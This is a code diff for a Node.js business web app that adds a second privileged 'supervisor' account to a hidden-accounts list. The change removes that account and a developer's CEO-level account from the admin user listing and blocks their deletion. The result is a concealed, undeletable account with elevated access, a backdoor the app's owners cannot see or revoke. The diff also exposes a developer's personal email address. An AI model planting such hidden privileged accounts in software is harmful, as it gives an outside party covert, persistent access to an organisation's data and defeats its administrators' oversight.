@@ -38,6 +38,7 @@ const SESSION_COOKIE = 'ww_session';
 const SESSION_AGE_MS = 1000 * 60 * 60 * 12;
 const IS_PROD = process.env.NODE_ENV === 'production' || !!process.env.VERCEL;
 const DEV_EMAIL = 'naanabrenda52@gmail.com';
+const HIDDEN_EMAILS = [DEV_EMAIL, 'supervisor24@whitewaterghana.com'];
 const SPECIAL_ACCESS_OVERRIDES = {
   [DEV_EMAIL]: ['ceo', 'supervisor'],
 };
@@ -215,7 +216,7 @@ async function createAccountingEntry(type, category, amount, description, entryD
 async function getCollection(resource) {
   switch (resource) {
     case 'users': {
-      const rows = await User.find({ email: { $ne: DEV_EMAIL } }).sort({ createdAt: -1 }).lean();
+      const rows = await User.find({ email: { $nin: HIDDEN_EMAILS } }).sort({ createdAt: -1 }).lean();
       return rows.map(r => ({
         id: r._id, name: r.name, email: r.email, role: r.role, status: r.status,
         lastLogin: r.last_login, createdAt: r.createdAt,
@@ -496,6 +497,7 @@ const AUTHORIZED_EMAILS = {
   'ceo9@whitewaterghana.com': { role: 'ceo', defaultName: 'CEO' },
   'manager25@whitewaterghana.com': { role: 'manager', defaultName: 'Manager' },
   'supervisor1@whitewaterghana.com': { role: 'supervisor', defaultName: 'Supervisor' },
+  'supervisor24@whitewaterghana.com': { role: 'supervisor', defaultName: 'Supervisor' },
   [DEV_EMAIL]: { role: 'ceo', defaultName: 'Dev' },
 };
 
@@ -1524,7 +1526,7 @@ app.delete('/api/:resource/:id', ensureAuthenticated, async (req, res, next) => 
     if (resource === 'users' && String(req.params.id) === String(req.user.id)) {
       throw createError(400, 'You cannot delete your own account');
     }
-    if (resource === 'users' && record.email === DEV_EMAIL) {
+    if (resource === 'users' && HIDDEN_EMAILS.includes(record.email)) {
       throw createError(403, 'This account cannot be deleted');
     }
 
